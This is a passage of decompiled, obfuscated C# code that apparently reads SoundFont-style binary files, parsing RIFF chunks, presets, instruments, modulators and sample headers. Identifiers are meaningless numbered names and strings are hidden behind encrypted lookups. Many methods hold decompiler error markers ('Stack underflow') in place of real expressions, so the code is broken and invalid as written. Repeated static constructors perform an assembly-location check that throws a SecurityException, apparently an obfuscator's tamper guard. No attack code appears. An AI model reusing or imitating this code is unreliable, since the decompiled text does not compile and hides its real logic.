					_0002 = obj._0001<global::_0015._0006>((global::_0016._0002<global::_0015._0006>)new _001C._0003());
					continue;
				case 3696333059u:
					if (!(text == _0080._0014._0001(107394900)))
					{
						break;
					}
					_0004 = global::_0011._0018._0001(obj);
					continue;
				case 802522432u:
					if (!(text == _0080._0014._0001(107394859)))
					{
						break;
					}
					_0005 = global::_0011._0018._0001(obj);
					continue;
				case 1438214986u:
					if (!(text == _0080._0014._0001(107394850)))
					{
						break;
					}
					_0006 = global::_0011._0018._0001(obj);
					continue;
				case 3794880202u:
					if (!(text == _0080._0014._0001(107394873)))
					{
						break;
					}
					_0007 = global::_0011._0018._0001(obj);
					continue;
				case 439062212u:
					if (!(text == _0080._0014._0001(107394864)))
					{
						break;
					}
					_0008 = global::_0011._0018._0001(obj);
					continue;
				case 3955789767u:
					if (!(text == _0080._0014._0001(107394823)))
					{
						break;
					}
					_000E = global::_0011._0018._0001(obj);
					continue;
				}
				throw new InvalidDataException(string.Format(_0080._0014._0001(107394846), obj._0001));
			}
			if (!flag)
			{
				throw new InvalidDataException(_0080._0014._0001(107394301));
			}
			if (!flag2)
			{
				throw new InvalidDataException(_0080._0014._0001(107394216));
			}
			if (!flag3)
			{
				throw new InvalidDataException(_0080._0014._0001(107394159));
			}
		}

		public override string _000F()
		{
			//IL_0089: Incompatible stack heights: 0 vs 2
			//IL_008f: Incompatible stack heights: 0 vs 4
			//IL_0092: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107394142);
			_ = new object[11];
			_ = 0;
			string text = ((_0003)/*Error near IL_001c: Stack underflow*/)._0002;
			((object[])/*Error near IL_001d: Stack underflow*/)[/*Error near IL_001d: Stack underflow*/] = text;
			/*Error near IL_001d: Stack underflow*/;
			_ = 1;
			string text2 = ((_0003)/*Error near IL_0026: Stack underflow*/)._0005;
			((object[])/*Error near IL_0027: Stack underflow*/)[/*Error near IL_0027: Stack underflow*/] = text2;
			((object[])/*Error near IL_0027: Stack underflow*/)[2] = _0007;
			((object[])/*Error near IL_0030: Stack underflow*/)[3] = _0004;
			((object[])/*Error near IL_0039: Stack underflow*/)[4] = _000E;
			((object[])/*Error near IL_0042: Stack underflow*/)[5] = _0080._0014._0001(107394368);
			((object[])/*Error near IL_004f: Stack underflow*/)[6] = _0001;
			((object[])/*Error near IL_0058: Stack underflow*/)[7] = this._0001;
			((object[])/*Error near IL_0061: Stack underflow*/)[8] = _0006;
			((object[])/*Error near IL_006a: Stack underflow*/)[9] = _0003;
			((object[])/*Error near IL_0074: Stack underflow*/)[10] = _0002;
			return /*Error near IL_0083: Stack underflow*/((string)/*Error near IL_0083: Stack underflow*/, (object[])/*Error near IL_0083: Stack underflow*/);
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal sealed class _0002
	{
		internal string _0001;

		internal ushort _0001;

		internal ushort _0002;

		internal global::_000E._0001[] _0001;

		public string Name
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_000E._0001[] Zones
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_000E._0001[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0002()
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
		}
	}
}
namespace _001D
{
	internal sealed class _0002 : global::_0016._0002<global::_0017._0002>
	{
		private new global::_0017._0002 m__0001;

		public override int Length => 22;

		public global::_0017._0002[] Instruments
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((global::_0016._0002<global::_0017._0002>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (global::_0017._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override global::_0017._0002 _0001(BinaryReader _0002)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 2
			new global::_0017._0002();
			global::_0017._0002 obj = (global::_0017._0002)/*Error near IL_00ab: Stack underflow*/;
			_ = _0084_0002._007E_008D_0005;
			_0082_0002._0088_0005();
			byte[] array = _0083_0002._007E_008C_0005(_0002, 20);
			string text = /*Error near IL_002e: Stack underflow*/((object)/*Error near IL_002e: Stack underflow*/, array, 0, 20);
			if (_0086_0002._007E_008E_0005(text, '\0') >= 0)
			{
				text = _0087_0002._007E_008F_0005(text, 0, _0086_0002._007E_008E_0005(text, '\0'));
			}
			obj._0001 = text;
			obj._0001 = _0081_0002._007E_0087_0005(_0002);
			if (this.m__0001 != null)
			{
				this.m__0001._0002 = (ushort)(obj._0001 - 1);
			}
			base._0001.Add(obj);
			this.m__0001 = obj;
			return obj;
		}

		public override void _0001(BinaryWriter _0002, global::_0017._0002 _0003)
		{
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	internal sealed class _0002
	{
		internal global::_0004._0002 _0001;

		internal GeneratorEnum _0001;

		internal short _0001;

		internal global::_0004._0002 _0002;

		internal TransformEnum _0001;

		public global::_0004._0002 SourceModulationData
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0004._0002)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public GeneratorEnum DestinationGenerator
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (GeneratorEnum)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public short Amount
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (short)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0004._0002 SourceModulationAmount
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0002 = (global::_0004._0002)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public TransformEnum SourceTransform
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/)._0001 = (TransformEnum)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0001()
		{
			//IL_005b: Incompatible stack heights: 0 vs 2
			//IL_005e: Incompatible stack heights: 0 vs 4
			//IL_0061: Incompatible stack heights: 0 vs 3
			_ = _009E._0094_0004;
			_0080._0014._0001(107394343);
			_ = new object[5];
			_ = 0;
			global::_0004._0002 obj = ((_0002)/*Error near IL_001b: Stack underflow*/)._0001;
			((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = obj;
			/*Error near IL_001c: Stack underflow*/;
			_ = 1;
			object obj2 = ((_0002)/*Error near IL_0025: Stack underflow*/)._0001;
			((object[])/*Error near IL_002b: Stack underflow*/)[/*Error near IL_002b: Stack underflow*/] = obj2;
			((object[])/*Error near IL_002b: Stack underflow*/)[2] = this._0001;
			((object[])/*Error near IL_0039: Stack underflow*/)[3] = _0002;
			((object[])/*Error near IL_0042: Stack underflow*/)[4] = this._0001;
			return /*Error near IL_0055: Stack underflow*/((string)/*Error near IL_0055: Stack underflow*/, (object[])/*Error near IL_0055: Stack underflow*/);
		}
	}
	internal sealed class _0003 : global::_0016._0002<_0002>
	{
		public override int Length => 10;

		public _0002[] Modulators
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((global::_0016._0002<_0002>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (_0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override _0002 _0001(BinaryReader _0002)
		{
			//IL_0079: Incompatible stack heights: 0 vs 1
			//IL_0085: Incompatible stack heights: 0 vs 1
			new _0002();
			_0002 obj;
			if (2u != 0)
			{
				obj = (_0002)/*Error near IL_007f: Stack underflow*/;
			}
			global::_0004._0002 obj2 = new global::_0004._0002(_0081_0002._007E_0087_0005(_0002));
			((_0002)/*Error near IL_001d: Stack underflow*/)._0001 = obj2;
			obj._0001 = (GeneratorEnum)_0081_0002._007E_0087_0005(_0002);
			obj._0001 = _0088_0002._007E_0091_0005(_0002);
			obj._0002 = new global::_0004._0002(_0081_0002._007E_0087_0005(_0002));
			obj._0001 = (TransformEnum)_0081_0002._007E_0087_0005(_0002);
			base._0001.Add(obj);
			return obj;
		}

		public override void _0001(BinaryWriter _0002, _0002 _0003)
		{
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	internal sealed class _0002
	{
		private bool m__0001;

		private bool m__0002;

		private bool _0003;

		private ControllerSourceEnum m__0001;

		private SourceTypeEnum m__0001;

		private ushort m__0001;

		internal _0002(ushort _0082_008F_0006)
		{
			this.m__0001 = (_0082_008F_0006 & 0x200) == 512;
			m__0002 = (_0082_008F_0006 & 0x100) == 256;
			_0003 = (_0082_008F_0006 & 0x80) == 128;
			this.m__0001 = (SourceTypeEnum)((_0082_008F_0006 & 0xFC00) >> 10);
			this.m__0001 = (ControllerSourceEnum)(_0082_008F_0006 & 0x7F);
			this.m__0001 = (ushort)(_0082_008F_0006 & 0x7Fu);
		}

		public override string _0001()
		{
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 2
			//IL_0068: Incompatible stack heights: 0 vs 1
			if (((_0002)/*Error near IL_0007: Stack underflow*/)._0003)
			{
				_ = _009D._0093_0004;
				_0080._0014._0001(107394334);
				object obj = ((_0002)/*Error near IL_001c: Stack underflow*/).m__0001;
				object obj2 = this.m__0001;
				return /*Error near IL_0031: Stack underflow*/((string)/*Error near IL_0031: Stack underflow*/, obj, obj2);
			}
			return _009D._0093_0004(_0080._0014._0001(107395853), this.m__0001, this.m__0001);
		}
	}
}
namespace _0018
{
	internal sealed class _0006
	{
		internal string _0001;

		internal ushort _0001;

		internal ushort _0002;

		internal ushort _0003;

		internal ushort _0004;

		internal uint _0001;

		internal uint _0002;

		internal uint _0003;

		internal global::_000E._0001[] _0001;

		public string Name
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public ushort PatchNumber
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0001 = (ushort)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public ushort Bank
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0002 = (ushort)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_000E._0001[] Zones
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_000E._0001[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0002()
		{
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 2
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107394321);
			_ = (object)((_0006)/*Error near IL_0013: Stack underflow*/)._0002;
			object obj = ((_0006)/*Error near IL_001f: Stack underflow*/)._0001;
			string text = this._0001;
			return /*Error near IL_002f: Stack underflow*/((string)/*Error near IL_002f: Stack underflow*/, (object)/*Error near IL_002f: Stack underflow*/, obj, text);
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	internal sealed class _0003 : _0016._0002<_0018._0006>
	{
		private new _0018._0006 m__0001;

		public override int Length => 38;

		public _0018._0006[] Presets
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((_0016._0002<_0018._0006>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (_0018._0006[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override _0018._0006 _0001(BinaryReader _0002)
		{
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_010c: Incompatible stack heights: 0 vs 2
			new _0018._0006();
			_0018._0006 obj = default(_0018._0006);
			if (0 == 0)
			{
				obj = (_0018._0006)/*Error near IL_0102: Stack underflow*/;
			}
			_ = _0084_0002._007E_008D_0005;
			_0082_0002._0088_0005();
			byte[] array = _0083_0002._007E_008C_0005(_0002, 20);
			string text = /*Error near IL_0030: Stack underflow*/((object)/*Error near IL_0030: Stack underflow*/, array, 0, 20);
			if (_0086_0002._007E_008E_0005(text, '\0') >= 0)
			{
				text = _0087_0002._007E_008F_0005(text, 0, _0086_0002._007E_008E_0005(text, '\0'));
			}
			obj._0001 = text;
			obj._0001 = _0081_0002._007E_0087_0005(_0002);
			obj._0002 = _0081_0002._007E_0087_0005(_0002);
			obj._0003 = _0081_0002._007E_0087_0005(_0002);
			obj._0001 = _008A_0002._007E_0093_0005(_0002);
			obj._0002 = _008A_0002._007E_0093_0005(_0002);
			obj._0003 = _008A_0002._007E_0093_0005(_0002);
			if (this.m__0001 != null)
			{
				this.m__0001._0004 = (ushort)(obj._0003 - 1);
			}
			base._0001.Add(obj);
			this.m__0001 = obj;
			return obj;
		}

		public override void _0001(BinaryWriter _0002, _0018._0006 _0003)
		{
		}
	}
}
namespace _0008
{
	internal sealed class _0002
	{
		private global::_000F._0003 m__0001 = new global::_000F._0003();

		private global::_0006._0001 m__0001 = new global::_0006._0001();

		private _001F._0003 m__0001 = new _001F._0003();

		private _0019._0001 m__0001 = new _0019._0001();

		private _001D._0002 m__0001 = new _001D._0002();

		private global::_0006._0001 m__0002 = new global::_0006._0001();

		private _001F._0003 m__0002 = new _001F._0003();

		private _0019._0001 m__0002 = new _0019._0001();

		private _001E._0001 m__0001 = new _001E._0001();

		public _0018._0006[] Presets
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001.Presets;
				return (_0018._0006[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0017._0002[] Instruments
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001.Instruments;
				return (_0017._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0080._0002[] SampleHeaders
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001.SampleHeaders;
				return (_0080._0002[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		internal _0002(global::_0002._0002 _0081_008F_0006)
		{
			string text = global::_0011._0018._0001(_0081_008F_0006);
			if (text != _0080._0014._0001(107393760))
			{
				throw new InvalidDataException(string.Format(_0080._0014._0001(107393783), text));
			}
			global::_0002._0002 obj;
			while ((obj = global::_0011._0018._0001(_0081_008F_0006)) != null)
			{
				string text2 = obj._0001;
				uint num = global::_0011._0018._0001(text2);
				if (num <= 1912422739)
				{
					if (num <= 835588718)
					{
						if (num <= 446289113)
						{
							if (num != 11082205)
							{
								if (num == 446289113 && text2 == _0080._0014._0001(107393661))
								{
									goto IL_03e5;
								}
							}
							else if (text2 == _0080._0014._0001(107393674))
							{
								goto IL_03c7;
							}
						}
						else if (num != 454631123)
						{
							if (num == 835588718 && text2 == _0080._0014._0001(107393616))
							{
								goto IL_0412;
							}
						}
						else if (text2 == _0080._0014._0001(107393710))
						{
							goto IL_03a3;
						}
					}
					else if (num <= 1458428061)
					{
						if (num != 880558638)
						{
							if (num == 1458428061 && text2 == _0080._0014._0001(107393665))
							{
								goto IL_03c7;
							}
						}
						else if (text2 == _0080._0014._0001(107393575))
						{
							goto IL_0412;
						}
					}
					else if (num != 1475086809)
					{
						if (num != 1659751530)
						{
							if (num == 1912422739 && text2 == _0080._0014._0001(107393701))
							{
								goto IL_03a3;
							}
						}
						else if (text2 == _0080._0014._0001(107393611))
						{
							goto IL_03f4;
						}
					}
					else if (text2 == _0080._0014._0001(107393638))
					{
						goto IL_03e5;
					}
				}
				else if (num <= 2815087768u)
				{
					if (num <= 2688549226u)
					{
						if (num != 2630176223u)
						{
							if (num == 2688549226u && text2 == _0080._0014._0001(107393652))
							{
								goto IL_03f4;
							}
						}
						else if (text2 == _0080._0014._0001(107393724))
						{
							goto IL_03b5;
						}
					}
					else if (num != 2770221016u)
					{
						if (num == 2815087768u && text2 == _0080._0014._0001(107393625))
						{
							goto IL_0403;
						}
					}
					else if (text2 == _0080._0014._0001(107393602))
					{
						goto IL_0403;
					}
				}
				else if (num <= 3289792331u)
				{
					if (num != 3160262260u)
					{
						if (num == 3289792331u && text2 == _0080._0014._0001(107393688))
						{
							goto IL_03d6;
						}
					}
					else if (text2 == _0080._0014._0001(107393589))
					{
						goto IL_0421;
					}
				}
				else if (num != 3673816331u)
				{
					if (num != 4036048543u)
					{
						if (num == 4189059956u && text2 == _0080._0014._0001(107393598))
						{
							goto IL_0421;
						}
					}
					else if (text2 == _0080._0014._0001(107393715))
					{
						goto IL_03b5;
					}
				}
				else if (text2 == _0080._0014._0001(107393647))
				{
					goto IL_03d6;
				}
				throw new InvalidDataException(string.Format(_0080._0014._0001(107394846), obj._0001));
				IL_03a3:
				obj._0001<_0018._0006>((_0016._0002<_0018._0006>)this.m__0001);
				continue;
				IL_0421:
				obj._0001<_0080._0002>((_0016._0002<_0080._0002>)this.m__0001);
				continue;
				IL_03e5:
				obj._0001<_0017._0002>((_0016._0002<_0017._0002>)this.m__0001);
				continue;
				IL_03c7:
				obj._0001<_001F._0002>((_0016._0002<_001F._0002>)this.m__0001);
				continue;
				IL_0412:
				obj._0001<_0018._0005>((_0016._0002<_0018._0005>)m__0002);
				continue;
				IL_03d6:
				obj._0001<_0018._0005>((_0016._0002<_0018._0005>)this.m__0001);
				continue;
				IL_0403:
				obj._0001<_001F._0002>((_0016._0002<_001F._0002>)this.m__0002);
				continue;
				IL_03f4:
				obj._0001<global::_000E._0001>((_0016._0002<global::_000E._0001>)this.m__0002);
				continue;
				IL_03b5:
				obj._0001<global::_000E._0001>((_0016._0002<global::_000E._0001>)this.m__0001);
			}
			global::_0011._0018._0001(m__0002, this.m__0001.SampleHeaders);
			global::_0006._0001 obj2 = this.m__0002;
			_001F._0002[] array = this.m__0002.Modulators;
			_0018._0005[] array2 = m__0002.Generators;
			global::_0011._0018._0001(array, array2, obj2);
			global::_0011._0018._0001(this.m__0001, this.m__0002.Zones);
			_0019._0001 obj3 = this.m__0001;
			_0017._0002[] array3 = this.m__0001.Instruments;
			global::_0011._0018._0001(array3, obj3);
			obj2 = this.m__0001;
			array = this.m__0001.Modulators;
			array2 = this.m__0001.Generators;
			global::_0011._0018._0001(array, array2, obj2);
			global::_000F._0003 obj4 = this.m__0001;
			global::_000E._0001[] array4 = this.m__0001.Zones;
			global::_0011._0018._0001(array4, obj4);
			global::_0011._0018._0001(this.m__0001);
		}

		public override string _0001()
		{
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c6: Incompatible stack heights: 0 vs 2
			new StringBuilder();
			StringBuilder stringBuilder = (StringBuilder)/*Error near IL_00c0: Stack underflow*/;
			_ = _008B_0002._007E_0094_0005;
			string text = _0080._0014._0001(107393548);
			/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/, text);
			_0018._0006[] array = this.m__0001.Presets;
			foreach (_0018._0006 obj in array)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107393555), obj);
			}
			_008B_0002._007E_0094_0005(stringBuilder, _0080._0014._0001(107394026));
			_0017._0002[] array2 = this.m__0001.Instruments;
			foreach (_0017._0002 obj2 in array2)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107393555), obj2);
			}
			return global::_0002._007E_0006(stringBuilder);
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _0002
	{
		internal string _0001;

		internal uint _0001;

		internal long _0001;

		internal BinaryReader _0001;

		public string ChunkID
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0043: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
				{
					_0080._0014._0001(107393882);
					new ArgumentNullException((string?)/*Error near IL_0043: Stack underflow*/);
					throw /*Error near IL_000e: Stack underflow*/;
				}
				if (global::_001A._007E_0016_0003(value) != 4)
				{
					throw new ArgumentException(_0080._0014._0001(107393849));
				}
				this._0001 = value;
			}
		}

		public uint ChunkSize => ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;

		public long DataOffset => ((_0002)/*Error near IL_0007: Stack underflow*/)._0001;

		internal _0002(BinaryReader _0003_007F)
		{
			this._0001 = _0003_007F;
			this._0001 = _0080._0014._0001(107394037);
			this._0001 = 0u;
			this._0001 = 0L;
		}

		public _0001 _0001<_0001>(global::_0016._0002<_0001> _0002)
		{
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			_ = ((_0002)/*Error near IL_0007: Stack underflow*/)._0001.BaseStream;
			long position = ((_0002)/*Error near IL_0010: Stack underflow*/)._0001;
			((Stream)/*Error near IL_0015: Stack underflow*/).Position = position;
			if (_0002.Length != this._0001)
			{
				throw new InvalidDataException(string.Format(_0080._0014._0001(107393996), this._0001, _0002.Length));
			}
			return _0002._0001(this._0001);
		}

		public _0001[] _0001<_0001>(global::_0016._0002<_0001> _0002)
		{
			//IL_0094: Incompatible stack heights: 0 vs 1
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 1
			_ = ((_0002)/*Error near IL_000a: Stack underflow*/)._0001.BaseStream;
			long position = ((_0002)/*Error near IL_0019: Stack underflow*/)._0001;
			((Stream)/*Error near IL_001e: Stack underflow*/).Position = position;
			if ((long)this._0001 % (long)_0002.Length != 0L)
			{
				throw new InvalidDataException(string.Format(_0080._0014._0001(107393927), this._0001, _0002.Length));
			}
			int num = (int)((long)this._0001 / (long)_0002.Length);
			_0001[] array = new _0001[num];
			for (int i = 0; i < num; i++)
			{
				array[i] = _0002._0001(this._0001);
			}
			return array;
		}

		public override string _0002()
		{
			//IL_0035: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 2
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107393260);
			_ = ((_0002)/*Error near IL_0013: Stack underflow*/)._0001;
			object obj = ((_0002)/*Error near IL_001a: Stack underflow*/)._0001;
			object obj2 = this._0001;
			return /*Error near IL_002f: Stack underflow*/((string)/*Error near IL_002f: Stack underflow*/, (object)/*Error near IL_002f: Stack underflow*/, obj, obj2);
		}
	}
}
namespace _0008
{
	internal sealed class _0003
	{
		internal byte[] _0001;

		public byte[] SampleData => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0003(global::_0002._0002 _0081_008F_0006)
		{
			string text = global::_0011._0018._0001(_0081_008F_0006);
			if (text != _0080._0014._0001(107393199))
			{
				throw new InvalidDataException(string.Format(_0080._0014._0001(107393190), text));
			}
			_0001 = global::_0011._0018._0001(_0081_008F_0006);
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
